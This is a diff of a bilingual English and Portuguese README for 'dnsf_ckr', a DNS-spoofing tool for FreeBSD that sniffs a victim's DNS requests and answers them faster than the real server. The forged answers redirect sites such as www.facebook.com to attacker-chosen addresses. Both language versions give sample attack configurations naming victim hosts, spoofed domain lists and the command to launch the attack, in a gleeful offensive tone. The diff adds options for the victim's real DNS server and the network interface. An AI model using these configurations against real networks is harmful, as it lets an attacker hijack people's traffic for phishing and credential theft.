@@ -3,19 +3,20 @@ Dnsf_ckr
 
 (sorry my bad english...)
 
-dnsf_ckr is a application used for messing up with domain names.
+dnsf_ckr is a application used for messing up with domain names. Until now it works on FreeBSD.
 
 The idea here is sniffing victim's dns requests and fake the response as soon as possible than real dns server.
 In this way is possible redirect the target machine to anywhere we want.
 
-MuHAuHaUHauHAuHAHuha! :)
+MuHAuHaUHauHAuHAHuha! :P
 
 ## Using dnsf_ckr
 
-At first you need to know about two things
+At first you need to know three things
 
     * The victim's ip address
-    * Which domain names you wish to spoof
+    * The victim's real DNS server IP
+    * What domain names you wish to spoof
 
 These informations must be supplied to dnsf_ckr through a configuration file.
 
@@ -30,28 +31,42 @@ we have the following attack configuration:
             sheep: 192.30.70.9
         ;
 
-        # and so, the domain that your victim access which you want to spoof, in form <domain>:<spoofed-ip>
+        # sheep requests name resolutions in 192.30.70.200 (from now on called "cheap-server")
 
-        namelist boring-sites-of-boring-people =
+        dns-servers =
+            cheap-server: 192.30.70.200
+        ;
+
+        # and so, the domain that your victim accesses and which you want to spoof, in form <domain>:<spoofed-ip>
+
+        namelist boring-sites =
             www.facebook.com: 192.30.70.101
         ;
 
         # finally, you inform your intentions to dnsf_ckr
 
         fake-nameserver =
-            with sheep mess up boring-sites-of-boring-people
+            with sheep mess up boring-sites
         ;
 
+        # but yet we need to describe how valid transactions (in normal conditions, e.g. not spoofed) should be occur.
 
-Okay, now you want to add a new attack based on a new victim and directing the "sheep" for others wilder domains too:
+        real-dns-transactions =
+            sheep sends requests to cheap-server
+        ;
 
+Okay, now you want to add a new attack based on a new victim and also direct the "sheep" for others wilder domains:
 
-        victims = 
+        victims =
             sheep: 192.30.70.9
             obama: 192.30.70.21
         ;
 
-        namelist boring-sites-of-boring-people =
+        dns-servers =
+            cheap-server: 192.30.70.200
+        ;
+
+        namelist boring-sites =
             www.facebook.com: 192.30.70.101
         ;
 
@@ -67,41 +82,48 @@ Okay, now you want to add a new attack based on a new victim and directing the "
             www.goduck.com: 192.30.70.103
         ;
 
+        real-dns-transactions =
+            sheep sends requests to cheap-server
+            obama sends requests to cheap-server
+        ;
+
         fake-nameserver =
-            with sheep mess up boring-sites-of-boring-people, webcommerce-sites
+            with sheep mess up boring-sites, webcommerce-sites
             with obama mess up search-engines
         ;
 
-Now, if all this presented data has been into "my-dirty-little-hacking.conf" file all we need to do is:
+Now, if the presented configuration data is into "my-dirty-little-hacking.conf" file... all we need to do is:
 
-        ./dnsf_ckr my-dirty-little-hacking.conf
+        ./dnsf_ckr --attack-map=my-dirty-little-hacking.conf --iface=em1
 
+The option --iface indicates the name of the interface that you use to access the network.
 
 Have fun!
-Rafael :)
+Santiago
 
 
 Dnsf_ckr
 --------
 
-dnsf_ckr e uma aplicacao usada para baguncar com os dominios.
+dnsf_ckr e uma aplicacao usada para baguncar com nomes de dominios. Ate agora isso funciona no FreeBSD.
 
-A ideia aqui e sniffar as requisicoes dns da vitima e forjar a resposta o quanto antes em relacao ao servidor dns real.
+A ideia aqui e sniffar as requisicoes dns da vitima e falsificar a resposta o quanto antes que o servidor dns real.
 Dessa forma e possivel redirecionar a maquina alvo para onde nos quisermos.
 
-MuHAuHaUHauHAuHAHuha! :)
+MuHAuHaUHauHAuHAHuha! :P
 
 ## Usando o dnsf_ckr
 
-Para comecar voce precisa saber de duas coisas
+Inicialmente voce precisa saber tres coisas
 
     * O endereco ip da vitima
-    * Quais nomes de dominio voce deseja spoofar
+    * O endereco ip do servidor DNS real da vitima
+    * Quais nomes de dominio voce quer spoofar
 
-Essas informacoes devem ser informadas para o dnsf_ckr por meio de um arquivo de configuracao.
+Essas informacoes devem ser informadas ao dnsf_ckr atraves do arquivo de configuracao.
 
-Supondo que sua vitima se chama "ovelha" e possui o ip "192.30.70.9" e acessa "www.facebook.com",
-teriamos a seguinte configuracao de ataque:
+Supondo que sua vitima e chamada "sheep" e tem o endereco ip "192.30.70.9" e acessa o "www.facebook.com", nos temos
+a seguinte configuracao de ataque:
 
         # dnsf_ckr attack config sample
 
@@ -111,28 +133,42 @@ teriamos a seguinte configuracao de ataque:
             sheep: 192.30.70.9
         ;
 
-        # and so, the domain that your victim access which you want to spoof, in form <domain>:<spoofed-ip>
+        # sheep requests name resolutions in 192.30.70.200 (from now on called "cheap-server")
 
-        namelist boring-sites-of-boring-people =
+        dns-servers =
+            cheap-server: 192.30.70.200
+        ;
+
+        # and so, the domain that your victim accesses and which you want to spoof, in form <domain>:<spoofed-ip>
+
+        namelist boring-sites =
             www.facebook.com: 192.30.70.101
         ;
 
         # finally, you inform your intentions to dnsf_ckr
 
         fake-nameserver =
-            with sheep mess up boring-sites-of-boring-people
+            with sheep mess up boring-sites
         ;
 
+        # but yet we need to describe how valid transactions (in normal conditions, e.g. not spoofed) should be occur.
 
-Ok, agora voce quer adicionar um novo ataque para uma nova vitima, alem de direcionar a "ovelha" para outros dominios
-mais selvagens:
+        real-dns-transactions =
+            sheep sends requests to cheap-server
+        ;
 
-        victims = 
+Certo, agora voce quer adicionar um novo ataque baseado em uma nova vitima e direcionar "sheep" para outros dominios mais selvagens:
+
+        victims =
             sheep: 192.30.70.9
             obama: 192.30.70.21
         ;
 
-        namelist boring-sites-of-boring-people =
+        dns-servers =
+            cheap-server: 192.30.70.200
+        ;
+
+        namelist boring-sites =
             www.facebook.com: 192.30.70.101
         ;
 
@@ -148,15 +184,21 @@ mais selvagens:
             www.goduck.com: 192.30.70.103
         ;
 
+        real-dns-transactions =
+            sheep sends requests to cheap-server
+            obama sends requests to cheap-server
+        ;
+
         fake-nameserver =
-            with sheep mess up boring-sites-of-boring-people, webcommerce-sites
+            with sheep mess up boring-sites, webcommerce-sites
             with obama mess up search-engines
         ;
 
-Agora, se todos esses dados apresentandos estiverem dentro do arquivo "my-dirty-little-hacking.conf" tudo o que precisamos fazer:
+Agora, se os dados de configuracao apresentados estao dentro do arquivo "my-dirty-little-hacking.conf"... tudo o que precisamos fazer e:
 
-        ./dnsf_ckr my-dirty-little-hacking.conf
+        ./dnsf_ckr --attack-map=my-dirty-little-hacking.conf --iface=em1
 
+A opcao --iface indica o nome da interface que voce usa para acessar a rede.
 
 Divirta-se!
-Rafael :)
+Santiago
